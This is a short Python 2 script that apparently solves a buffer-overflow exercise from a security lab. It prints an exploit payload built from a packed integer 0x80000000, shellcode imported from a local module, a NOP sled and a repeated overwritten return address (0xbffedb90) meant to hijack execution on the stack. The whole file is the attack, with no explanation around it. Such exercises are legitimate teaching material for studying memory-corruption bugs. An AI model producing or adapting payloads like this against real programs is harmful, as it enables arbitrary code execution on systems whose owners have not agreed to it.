#!/usr/bin/python

from shellcode import shellcode 
from struct import pack
print pack("<I", 0x80000000) + shellcode + "\x90"*17 + pack("<I", 0xbffedb90)+pack("<I", 0xbffedb90)

